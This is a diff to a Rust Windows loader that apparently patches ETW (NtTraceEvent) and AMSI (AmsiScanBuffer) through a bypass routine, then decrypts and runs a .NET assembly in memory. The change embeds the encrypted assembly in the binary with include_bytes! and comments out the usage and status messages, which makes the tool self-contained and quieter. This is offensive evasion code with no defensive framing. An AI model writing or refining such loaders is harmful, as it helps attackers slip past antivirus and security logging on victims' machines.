@@ -18,6 +18,8 @@ use windows_sys::Win32::{
 static mut NT_TRACE_EVENT_ADDR: *mut c_void = null_mut();
 static mut AMSI_SCAN_BUFFER_ADDR: *mut c_void = null_mut();
 
+const ASSEMBLY: &[u8] = include_bytes!("../assembly.enc");
+
 const KEY: &[u8] = &[
     0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
     0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
@@ -222,28 +224,29 @@ fn bypass() {
 fn main() {
     let args: Vec<String> = env::args().collect();
 
-    if args.len() < 2 {
-        println!("[+] Usage: {} assembly.enc <arguments>", args[0]);
-        std::process::exit(0);
-    }
+    // if args.len() < 2 {
+    //     println!("[+] Usage: {} assembly.enc <arguments>", args[0]);
+    //     std::process::exit(0);
+    // }
 
-    let mut assembly_args: Vec<String> = Vec::new();
+    // let mut assembly_args: Vec<String> = Vec::new();
 
-    if args.len() > 2 {
-        assembly_args = args[2..].to_vec();
-    }
+    // if args.len() > 2 {
+    let assembly_args = args[1..].to_vec();
+    // }
 
-    let path = args[1].clone();
+    // let path = args[1].clone();
 
-    println!(
-        "[+] Running {} with argument: {}",
-        path,
-        assembly_args.join(" ")
-    );
+    // println!(
+    //     "[+] Running {} with argument: {}",
+    //     path,
+    //     assembly_args.join(" ")
+    // );
 
-    let mut file = File::open(path).expect("Failed to open file");
-    let mut buffer = Vec::new();
-    file.read_to_end(&mut buffer).expect("Failed to read file");
+    // let mut file = File::open(path).expect("Failed to open file");
+    // let mut buffer = Vec::new();
+    // file.read_to_end(&mut buffer).expect("Failed to read file");
+    let mut buffer = ASSEMBLY.to_vec();
 
     bypass();
 
